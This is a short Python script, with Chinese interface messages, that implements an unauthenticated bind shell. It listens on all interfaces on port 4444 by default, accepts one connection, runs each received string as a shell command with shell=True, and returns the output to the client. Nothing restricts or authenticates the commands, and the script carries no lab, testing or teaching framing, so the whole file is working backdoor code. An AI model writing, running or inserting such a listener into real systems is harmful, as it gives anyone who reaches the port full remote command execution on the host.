import socket
import subprocess
import click
@click.command()
@click.option('--port', default=4444, type=int, help='监听的端口')
def main(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(1)
    print(f'监听 0.0.0.0:{port}，等待连接...')
    client_socket, client_address = server.accept()
    print(f'收到连接: {client_address}')
    while True:
        data = client_socket.recv(1024).decode('utf-8')
        if not data or data.strip().lower() == 'exit':
            break
        result = subprocess.run(data, shell=True,
                                capture_output=True, text=True)
        output = result.stdout + result.stderr
        client_socket.sendall(output.encode('utf-8'))
    client_socket.close()
    server.close()
    print('连接已关闭')


if __name__ == '__main__':
    main()
